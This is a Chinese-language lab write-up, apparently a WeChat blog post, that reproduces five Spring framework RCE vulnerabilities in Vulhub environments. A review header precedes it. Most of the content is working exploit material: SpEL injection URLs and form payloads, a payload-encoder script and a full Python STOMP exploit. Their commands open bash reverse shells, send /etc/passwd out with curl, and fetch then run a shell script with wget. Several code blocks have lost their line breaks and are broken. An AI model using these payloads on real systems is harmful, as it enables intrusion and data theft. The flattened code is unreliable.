---
source: "MrWQ/vulnerability-paper"
product: "Spring 生态 / Vulhub"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2016-4977; CVE-2017-4971; CVE-2017-8046; CVE-2018-1270; CVE-2018-1273"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "spring 常见漏洞总结"
prerequisites: "来源所述条件，未列明部分仍待核：列五个受影响范围，1270 与其他文有边界冲突；环境说明使用 Python2/pip 和双渠道 compose"
side_effects: "未执行；本文需注意的操作影响：实验副作用未交代；wget 写 /tmp/1 然后执行、回连与数据外传，缺恢复和隔离要求"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/4zynsLR-2oiewOMzVo7-dA"
id: "vw-d6d6d3e6e53ba9bae1f7a706"
entity_id: "ve-d6d6d3e6e53ba9bae1f7a706"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：列五个受影响范围，1270 与其他文有边界冲突；环境说明使用 Python2/pip 和双渠道 compose

代码与实验材料：509 行全文，包括完整长编码表达式；多个 Python 和 Java 块丢换行，截图依赖明显；未运行

来源证据范围：微信原文和 Vulhub，部分补丁描述只有截图，无逐项原始 commit

- **结论使用边界（1）**：关键 PoC 代码被压平失效；依据：4977 生成器从 shebang 到 print 同一行；1270 全 Python 程序一行且 shebang 吞掉后文。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：漏洞判定混淆功能页与漏洞；依据：8046 称访问 /customers/1 返回页面则存在漏洞，仅能确认示例接口。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：补丁可暴力破解结论缺量化证据；依据：4977 称随机六位前缀只要请求足够多就失效，未说明生命周期、熵或实际可行性。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **凭据与会话边界（4）**：参数与代码排版破损；依据：1273 表单 repeated=111&amp;Password=111 与重复密码字段不符；8046 两条 bash 命令拼接；Java 尾部有转义大括号。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **操作与副作用边界（5）**：实验副作用未交代；依据：wget 写 /tmp/1 然后执行、回连与数据外传，缺恢复和隔离要求。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# spring 常见漏洞总结

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4zynsLR-2oiewOMzVo7-dA)

本文将对 spring 常见的漏洞进行总结。  

简介
==

Spring 的英文翻译为春天，可以说是给 Java 程序员带来了春天，因为它极大的简化了开发。得出一个公式：Spring = 春天 = Java 程序员的春天 = 简化开发。最后的简化开发正是 Spring 框架带来的最大好处。

Spring 是一个开放源代码的设计层面框架，它是于 2003 年兴起的一个轻量级的 Java 开发框架。由 Rod Johnson 创建，其前身为 Interface21 框架，后改为了 Spring 并且正式发布。Spring 是为了解决企业应用开发的复杂性而创建的。它解决的是业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为 J2EE 应用程序开发提供集成的框架。Spring 使用基本的 JavaBean 来完成以前只可能由 EJB 完成的事情。然而，Spring 的用途不仅限于服务器端的开发。从简单性、可测试性和松耦合的角度而言，任何 Java 应用都可以从 Spring 中受益。简单来说，Spring 是一个分层的 JavaSE/EE full-stack(一站式) 轻量级开源框架。Spring 的理念：不去重新发明轮子。其核心是控制反转（IOC）和面向切面（AOP）。

Spring 框架包含的功能大约由 20 个小模块组成。这些模块按组可分为核心容器 (Core Container)、数据访问 / 集成(Data Access/Integration)、Web、面向切面编程(AOP 和 Aspects)、设备(Instrumentation)、消息(Messaging) 和测试(Test)。如下图所示：

![](../../.resource/remote/2038832a941915ae0e1ea35b88ce7fa4ba2c8eaf6dc072ca9056d00a4ad1e464.png)

漏洞环境搭建
======

这里我为了方便，使用的是 vulhub 搭建 docker 进行漏洞复现

首先安装 curl 和 docker

```
sudo apt install curl
sudo apt install docker.io

docker -v //查看是否安装成功
```

![](../../.resource/remote/fea48d51c6e6d1196254cd5876f6007f681c0910a02abc593d9f8bfe76bdcc4f.png)

然后安装 python 和 pip 环境，命令如下

```
sudo apt install python
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python get-pip.py

pip -V //查看是否安装成功
```

![](../../.resource/remote/3e8f3bcec816da12a35b5b0b8e2bd5e2db272ef647b45017105b4544b4576f7c.png)

然后再安装 docker-compose

```
pip install docker-compose
sudo apt install docker-compose
docker-compose -v
```

![](../../.resource/remote/b23342b4fe313cb041fd10e620ceb48d3c7513d77baf7e52595bb514eddfa197.png)

![](../../.resource/remote/37aaf52df1530c0f77ecfc26ee3e528f7b214408a8dcfea8dbc4f983fe2a5a5e.png)

到这个地方 docker 环境就已经搭建好了，这时候需要从 github 上把 vulhub 的漏洞环境给 clone 下来，这里直接 clone 网不太好，我就直接下载下来了 copy 到了靶机上

```
git clone https://github.com/vulhub/vulhub.git
```

下载好之后进入 spring 漏洞环境，这里看到有 5 个 CVE 漏洞，我们一个一个来

![](../../.resource/remote/e77311d7b25cf883926efc73793e2af2137a2988f7aaeae659e8203372ca0dac.png)

cve-2016-4977
=============

Spring Security OAuth RCE(cve-2016-4977)，是为 Spring 框架提供安全认证支持的一个模块，在 7 月 5 日其维护者发布了这样一个升级公告，主要说明在用户使用`Whitelabel views`来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。漏洞的发现者在 10 月 13 日公开了该漏洞的挖掘记录

影响版本
----

1.0.0-1.0.5、2.0.0-2.0.9

漏洞分析
----

这个漏洞的触发点也是对用户传的参数的递归解析，从而导致 SpEL 注入，可是两者的补丁方式大不相同。Springboot 的修复方法是创建一个 NonRecursive 类，使解析函数不进行递归。而 SpringSecurityOauth 的修复方法则是在前缀 ${前生成一个六位的字符串，只有六位字符串与之相同才会对其作为表达式进行解析。然而如果请求足够多，这种补丁也是会失效的。

这里直接查看补丁情况

![](../../.resource/remote/9c2b5c55e946f9ab8c94d4638550fc3dad528f7fa208f265fec3f4902104ef17.png)

可以看到在第一次执行表达式之前程序将`$`替换成了由`RandomValueStringGenerator().generate()`生成的随机字符串，也就是`${errorSummary} -> random{errorSummary}`，但是这个替换不是递归的，所以`${2334-1}`并没有变。

然后创建了一个`helper`使程序取`random{}`中的内容作为表达式，这样就使得`errorSummary`被作为表达式执行了，而`${2334-1}`因为不符合`random{}`这个形式所以没有被当作表达式，从而也就没有办法被执行了。

不过这个 Patch 有一个缺点：`RandomValueStringGenerator`生成的字符串虽然内容随机，但长度固定为 6，所以存在暴力破解的可能性。

漏洞复现
----

首先进入 CVE-2016-4977 的 docker 环境

![](../../.resource/remote/55792e7b77be2bc0aaa6d233677303f59261a357470fa943ab2b83c000266792.png)

访问 url，输入 admin/admin

```
http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test
```

![](../../.resource/remote/559d257d9e0c436b9d186b5c9e8962e29b6009963e4763bbaa086bed6aed8272.png)

出现以下界面则存在漏洞

![](../../.resource/remote/c8adf309f60996f8bf9baf1312482b1daa9bb0c3371f2b8f657bb1c9d186c470.png)

使用 github 上找到的 poc 对传入值进行处理

```
#!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)
```

![](../../.resource/remote/5805177fed3f27a7d98e7d55bfaebac687e76dc9a57f84fbfd24206f83849d9e.png)

这里我传入一个 whoami，返回了一个 payload

![](../../.resource/remote/56842696802058a36672e4d54cd8ae2be4b235f498bc935e84e4e0b9012c3349.png)

将这个 payload 拼接到之前的网址里面访问可以发现，这里返回了一个`[java.lang.UNIXProcess@f2e3e13]`，说明代码已经执行了

```
http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&client_id=acme&scope=openid&redirect_uri=http://test
```

![](../../.resource/remote/7a00078c953b9630f3b45ea284a2134cfb94be47d710c32b132e8d58fe1df9c1.png)

这里使用 curl 发送一个请求即可得到回显得内容

```
curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
```

![](../../.resource/remote/7a3549225fbf224e7b7738751076b733f0ed601f274c89a818b0bfda2ae77342.png)

这里再使用 nc 监听尝试反弹 shell

![](../../.resource/remote/a1036b16532227d81e806769779812bdcb589f6b9313a01248e2138e1f678cc8.png)

使用到 bash 反弹，这里需要绕过 exec() 变形

```
bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
```

使用 http://www.jackson-t.ca/runtime-exec-payloads.html 进行 payload 处理

![](../../.resource/remote/9c6743216b968e61c114d2456d202790d87fa10aea214c78bd5ae3b70baf5c06.png)

将处理后的命令再放入 poc.py

![](../../.resource/remote/872fb6049de287f4e86cfa200e4402bd107893cca36b95b55cf4ed60c8d0c444.png)

得到新的 payload 并拼接到网址里面

```
http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(85)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test
```

然后再访问这个网站即可得到反弹 shell

![](../../.resource/remote/27228aade808d788bb0cf8764b211fea63b860a14fe17b7aada801c8dec2fba4.png)

CVE-2017-4971
=============

Spring Web Flow 框架远程代码执行 (CVE-2017-4971) 漏洞，是由于 Spring Web Flow 的数据绑定问题带来的表达式注入，从而导致任意代码执行。

影响版本
----

2.4.0-2.4.4、Older unsupported versions are also affected

漏洞分析
----

view 对象处理用户事件，会根据 HTTP 参数绑定相应的 model

![](../../.resource/remote/14c73268b43e16c44eea5515d97cc409e60fb35f9254f3e8a7aa8af2904346ed.png)

如果 model 没有设置`BinderConfiguration`, 则会调用`addDefaultMappings`函数

![](../../.resource/remote/ee053ff6e5be3d581b7c2eeec8dc304f6546022c5f16d7d9030127e4cf31aaeb.png)

进一步查看`addDefaultMappings`函数，可以发现输入参数以`fieldMarkerPrefix`(“_”) 开头，则会调用`addEmptyValueMapping`函数

![](../../.resource/remote/163327253b5e0a05847dd498587826b3f86d4b02784f35b25e3cd9230e922d43.png)

若`useSpringBeanBinding`参数设置为`false`, 则 `expressionParser`将设置为`SpelExpressionParser`对象的实例，而不是`BeanWrapperExpressionParser`对象的实例。当调用`getValueType`函数时，`SpelExpressionParser`对象将执行表达式，触发任意代码执行

![](../../.resource/remote/282cc8665078baea62a03723f9ce64062c1c1b472f683a84056216d0ec63e388.png)

漏洞复现
----

首先进入 CVE-2017-4971 的 docker 环境

![](../../.resource/remote/c721381589ff0ab29296af6bcab8fa0b7089f08d953480983d9273001f5c83dd.png)

点击登录![](../../.resource/remote/16799af4fe607732b1fc0d3f6c6ead8cf2e3efd457553deb8b158b5eabf96455.png)

这里列出了一些登录账户，这里随便使用一个登录即可

![](../../.resource/remote/e9405a5e14cee700b6e07a6f36c3b933bc076c89f1c201b4500b515f1b690c4e.png)

登录之后显示如下界面

![](../../.resource/remote/1837d9ef864d61ae6ffe9b37f18b797b667bb81adfa04271e858ad80a6b08321.png)

然后访问 http://192.168.1.10:8080/hotels/1，点击`Book Hotel`

![](../../.resource/remote/f070d1f2aa1d4f83d151ec29d39ca02f671e44b7124d62a51bbd9e18a9f28bef.png)

这里要把信用卡和名字都填一下，然后点击`Proceed`

![](../../.resource/remote/6c346140ae1850addd7eda0aa73a55fcd5665019a20e2491576c979e7b7e1644.png)

进入如下页面，此处用 bp 抓包

![](../../.resource/remote/d4e1b00bf40a612a1a35fcead3e09af00188d2399a99584dbf526feb3077931b.png)

bp 抓包如下所示

![](../../.resource/remote/f601f5e5477c6d49b54e525f6c05348110453c34181fe9c7402322017118b89b.png)

这里构造一个 bash 反弹的 payload

```
&_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.1.2/5555 0>%261")).start()=vulhub
```

打开 nc 监听端口

![](../../.resource/remote/df0ba998cc40a25c240697064e64367b8c95dccf344bcf52eb026bcd847ecfb6.png)

把构造的 payload 放入抓到的包里发送

![](../../.resource/remote/57a815ce980b6c48ae2ab1b953a4ec865856b4031f6ef1f5a80d23b918423428.png)

即可收到反弹 shell

![](../../.resource/remote/e2c9ad41b4dad4125c055824e229d2bc4c140a1abf72a6fb5cac6317671e1985.png)

CVE-2017-8046
=============

Spring-Data-REST-RCE(CVE-2017-8046)，`Spring Data REST`对 PATCH 方法处理不当，导致攻击者能够利用 JSON 数据造成 RCE。本质还是因为 spring 的 SPEL 解析导致的 RCE

影响版本
----

Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3 Spring Boot version < 2.0.0M4 Spring Data release trains < Kay-RC3

漏洞分析
----

这里直接从补丁分析，从官方的描述来看就是就是 Spring-data-rest 服务处理 PATCH 请求不当，导致任意表达式执行从而导致的 RCE。首先来看下补丁，主要是 evaluateValueFromTarget 添加了一个校验方法 verifyPath，对于不合规格的 path 直接报异常退出，主要是 property.from(pathSource,type) 实现，基本逻辑就是通过反射去验证该 Field 是否存在于 bean 中

![](../../.resource/remote/52e91a7a04644b13f863d5277e2bfdf853c5ea0d4586e606fdf6e62b0b139aba.png)

漏洞复现
----

进入 CVE-2017-8046 的 docker 环境

![](../../.resource/remote/9252069f1926a5dc43243747f05d2f598e91a6003273f7a20b82194ed1efb60a.png)

访问 http://192.168.1.10:8080/customers/1 返回如下界面则存在漏洞

![](../../.resource/remote/2695a4f50956114dfba1199502fb76ac9d905e4cb3db8e27e70b6c8dd170bab5.png)

这里先对`customers/1`这个页面 bp 抓包，还是通过 bash 反弹，通过处理后得到命令

```
bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}
```

因为这里执行的代码被编码为十进制位于 new java.lang.String(new byte[]{xxxxxx}) 中，所以需要对 bash 命令转成十进制编码

使用 python 进行编码处理，在 python 中转十进制的方法为`",".join(map(str, (map(ord,"命令"))))`

```
",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"))))
```

![](../../.resource/remote/3387b87b1147cb8687d33ab9dba3f3af3c56ff3afa490af6454f582ad03abcc9.png)

得到十进制后放入 bp 包里面进行构造

```
[ { "op": "replace",    "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,117,77,105,56,49,78,84,85,49,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",   "value": "vulhub"  }]
```

构造后如图所示

![](../../.resource/remote/5dd456888fc5f2365a2ba114516b60e4b51d30e263e8a7f4187f4e61ace49069.png)

发包即可得到反弹 shell

![](../../.resource/remote/f1820e10f039b24d0d7f34284e2c1a5e606c768fb7a80fc9db98152e41e34953.png)

CVE-2018-1270
=============

Spring Messaging 命令执行漏洞 (CVE-2018-1270)，Spring 框架中的 **spring-messaging** 模块提供了一种基于 WebSocket 的 STOMP 协议实现，STOMP 消息代理在处理客户端消息时存在 SpEL 表达式注入漏洞，攻击者可以通过构造恶意的消息来实现远程代码执行。

影响版本
----

Spring Framework 5.0 - 5.0.5 Spring Framework 4.3 - 4.3.15

漏洞分析
----

由`expression`，`getValue`，`setValue`造成的代码执行，造成这种命令执行是由 Spring 的 SPEL 表达式造成的

![](../../.resource/remote/cdda47d1053bb9df307b6c8c2893c25f8b243da7c01af6a4d8c151e98c026ebd.png)

SPEL 命令执行有两种方式，一是静态方法，二是 new 对象

再看一下 spring-boot-messaging 实现中的代码

```
Expression expression = sub.getSelectorExpression();if (expression == null) {    result.add(sessionId, subId);} else {    if (context == null) {        context = new StandardEvaluationContext(message);        context.getPropertyAccessors().add(new DefaultSubscriptionRegistry.SimpMessageHeaderPropertyAccessor());    }    try {        if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {            result.add(sessionId, subId);        }    } catch (SpelEvaluationException var13) {        if (this.logger.isDebugEnabled()) {            this.logger.debug("Failed to evaluate selector: " + var13.getMessage());        }    } catch (Throwable var14) {        this.logger.debug("Failed to evaluate selector", var14);    \}\}
```

那么一是可以利用`sub.getSelectorExpression()`得到 selector 的表达式，二是利用`Boolean.TRUE.equals(expression.getValue(context, Boolean.class))`获取表达式的值，从而造成命令执行

漏洞复现
----

进入 CVE-2018-1270 的 docker 漏洞环境

![](../../.resource/remote/71397f0babd88377ae795ba4e278f56616a357bfb87f88a554962c9a6c13123e.png)

访问 http://192.168.1.10:8080/gs-guide-websocket

![](../../.resource/remote/8ffd031879d8ebb535313e6baad5c7593c3290dc0d2ffd7ef546641acfebb4ed.png)

这里直接使用前辈们写好的 exp，注意修改一下 bash 命令和靶机地址即可

```
#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport json logging.basicConfig(stream=sys.stdout, level=logging.INFO) def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))  class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)     def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)         def send(self, command, headers, body=''):        data = [command.upper(), '\n']         data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))                 data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])         response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")     def __del__(self):        self.session.close()  sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.start()time.sleep(1) sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",    'id': 'sub-0',    'destination': '/topic/greetings'}) data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)
```

首先还是 bash 编码

![](../../.resource/remote/513700fe921bc1161b726136a633569e80a7373a04a5f8b4063b8a4d4dbae123.png)

修改 exp 中的靶机 ip 和反弹命令

```
sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",
```

如图所示

![](../../.resource/remote/794efa5c2bc1690e9ea17db64da59e095a77ba22b2e3ba504b2dc134daf7c1ea.png)

运行 poc.py 即可得到反弹 shell

![](../../.resource/remote/d1ac1f9ae6575e3f03e8c1a7bbd53b9c054537e66faefe1bcf330cd5b5024750.png)

CVE-2018-1273
=============

Spring Data Commons 远程命令执行 (CVE-2018-1273)，当用户在项目中利用了 Spring-data 的相关 web 特性对用户的输入参数进行自动匹配的时候，会将用户提交的 form 表单的 key 值作为 Spel 的执行内容而产生漏洞

影响版本
----

Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)

漏洞分析
----

这里直接看补丁进行分析，这是一个 spel 表达式注入漏洞。补丁的内容如下：

![](../../.resource/remote/6461f1151ec671d59cd9ee11f73c7815f009582c16f01cec9575223c3006caf0.png)

补丁大致就是将 StandardEvaluationContext 替代为 SimpleEvaluationContext，由于 StandardEvaluationContext 权限过大，可以执行任意代码，会被恶意用户利用。

SimpleEvaluationContext 的权限则小的多，只支持一些 map 结构，通用的 jang.lang.Runtime,java.lang.ProcessBuilder 都已经不再支持。

漏洞复现
----

首先进入 CVE-2018-1273 的 docker 环境

![](../../.resource/remote/bb244119dd1b2125c98694dee7ff52c32d4cee739d26c379e469abebb99e01e0.png)

访问 http://192.168.1.10:8080/users 并用 bp 抓包

![](../../.resource/remote/0c0771e4ccca2cc3b14c916c2a8f83e88a0676a91755a5400201369f8efcb3f8.png)

这里随便填一下 Username 跟 Password

![](../../.resource/remote/e8fe1e04c931c0bde8ed1dd2bc9eabbd70f7662d9b7d947914c4e86cec1e9e33.png)

生成一个 shell.sh 文件

```
bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
```

![](../../.resource/remote/abb37897237d169b66b1441d06983a3098c63a3f0f5e283a65136b02a8911d1f.png)

用 python 起一个 http 服务，并构造 payload 下载 shell.sh 文件保存在 / tmp / 目录下，名称为 1

```
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.1.2:8000/shell.sh")]=111&password=111&repeated=111&Password=111
```

![](../../.resource/remote/6783accbb2c7d0b86fa47e8260ae51510f62048b8f2955d2f830090da1539797.png)

nc 打开端口监听再构造 payload 进行命令执行即可收到反弹 shell

```
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/1")]=111&password=111&repeated=111&Password=111
```

![](../../.resource/remote/38bd3c174232b940c3a802919a860b5195e38389ae890edf4d012dc5ffcc571d.png)

加下方 wx，拉你一起进群学习

![](../../.resource/remote/ebaf7990892e359dcac53556aa0a94a05858e409d2d40bad57c2787baaa038ad.jpg)

往期推荐

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

内网环境下的横向移动总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499769&idx=1&sn=e52725ea95e63ca860815d26304bf2da&chksm=ce674545f910cc535e5028081bc0c2bdc99fb2040c9d357f1bc15e347b7835e579ea9741e24f&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

利用卷影拷贝服务提取 ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

[

从 mimikatz 抓取密码学习攻防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497664&idx=1&sn=c63231e4cfca59a548b9d1de4bd66417&chksm=ce674d7cf910c46ac33e994d91486e197ed884461646096a0e4d0eeaf289e7adaf2c8097d7e0&scene=21#wechat_redirect)

[

shellcode 编写探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497564&idx=1&sn=e061aea7457034672babe21d307c5a0b&chksm=ce674de0f910c4f66c5c05653005337f7df136b03a757a1549920086d1bbd5467904e59e0ca1&scene=21#wechat_redirect)

[

windows 消息机制详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497563&idx=1&sn=d02e171994a3cf914fd41d91e7f3f560&chksm=ce674de7f910c4f1a743226847722370202de0b1ef537f4102f2179d9197b23f92f7de8c7f82&scene=21#wechat_redirect)

[

自删除技术详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497473&idx=1&sn=b56bc8bf42442f8917f5903f470fbc77&chksm=ce674dbdf910c4ab7b5b8205d29e381774b69f3a4e8c23fdad5da0eaba7cc0d8f00f95d7c03b&scene=21#wechat_redirect)

 ![](../../.resource/remote/55f308d098bfa107cc98f20cc1f768d132358ccc277455c9691cf54a5b9f94b7.png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 78 篇原创内容  公众号

![](../../.resource/remote/e85460cd8b12a173b067fde19cd94238f71deaa9f92e91a3b77b4693fb898ce4.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
